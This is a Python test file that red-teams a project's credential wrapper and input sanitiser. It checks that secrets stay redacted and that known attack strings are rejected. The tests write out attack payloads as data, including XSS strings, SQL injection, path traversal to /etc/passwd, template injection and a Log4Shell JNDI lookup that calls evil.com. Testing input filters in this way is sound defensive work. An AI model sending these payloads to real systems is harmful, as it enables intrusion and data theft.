"""Day 4 AppSec: Red team crypto.py and validation.py."""

import pytest

from vajra.core.crypto import SecureCredential
from vajra.core.validation import InputSanitiser, InputValidationError

# --- CREDENTIAL LEAK TESTS ---

# Fake AWS key used in AWS documentation — not a real credential
FAKE_AWS_KEY = b"AKIAIOSFODNN7EXAMPLE"  # pragma: allowlist secret
FAKE_AWS_KEY_STR = FAKE_AWS_KEY.decode()


def test_credential_never_in_print() -> None:
    cred = SecureCredential.from_plaintext(FAKE_AWS_KEY)
    assert FAKE_AWS_KEY_STR not in str(cred)
    assert "REDACTED" in str(cred)


def test_credential_never_in_repr() -> None:
    cred = SecureCredential.from_plaintext(FAKE_AWS_KEY)
    assert FAKE_AWS_KEY_STR not in repr(cred)
    assert "REDACTED" in repr(cred)


def test_credential_never_in_fstring() -> None:
    cred = SecureCredential.from_plaintext(FAKE_AWS_KEY)
    assert FAKE_AWS_KEY_STR not in f"{cred}"


def test_credential_never_in_list() -> None:
    cred = SecureCredential.from_plaintext(FAKE_AWS_KEY)
    assert FAKE_AWS_KEY_STR not in str([cred])


def test_credential_decrypt_returns_original() -> None:
    plaintext = b"my-secret-key-12345"
    cred = SecureCredential.from_plaintext(plaintext)
    assert cred.decrypt() == plaintext


def test_credential_destroy_prevents_decrypt() -> None:
    cred = SecureCredential.from_plaintext(b"secret")
    cred.destroy()
    with pytest.raises(RuntimeError, match="destroyed"):
        cred.decrypt()


def test_credential_context_manager_destroys() -> None:
    with SecureCredential.from_plaintext(b"secret") as cred:
        assert cred.decrypt() == b"secret"
    with pytest.raises(RuntimeError, match="destroyed"):
        cred.decrypt()


# --- INPUT SANITISER ATTACK PAYLOADS ---


def test_blocks_basic_xss() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="xss"):
        s.sanitise("<script>alert(1)</script>")


def test_blocks_event_handler_xss() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="xss"):
        s.sanitise("<img src=x onerror=alert(1)>")


def test_blocks_svg_xss() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="xss"):
        s.sanitise("<svg/onload=alert(1)>")


def test_blocks_javascript_protocol() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="xss"):
        s.sanitise("javascript:alert(1)")


def test_blocks_sql_injection() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="sql"):
        s.sanitise("' OR 1=1 --")


def test_blocks_log4shell() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="log4shell"):
        s.sanitise("${jndi:ldap://evil.com}")


def test_blocks_path_traversal() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="path"):
        s.sanitise("../../etc/passwd")


def test_blocks_template_injection() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="template"):
        s.sanitise("{{7*7}}")


def test_blocks_null_byte() -> None:
    s = InputSanitiser()
    with pytest.raises(InputValidationError, match="null"):
        s.sanitise("\x00hidden")


def test_allows_clean_input() -> None:
    s = InputSanitiser()
    result = s.sanitise("normal cloud asset name")
    assert result == "normal cloud asset name"


def test_blocks_deeply_nested_dict() -> None:
    s = InputSanitiser()
    # Build a dict nested 12 levels deep (limit is 10)
    data: dict[str, object] = {"key": "value"}
    for _ in range(12):
        data = {"nested": data}
    with pytest.raises(InputValidationError, match="depth"):
        s.sanitise_dict(data)
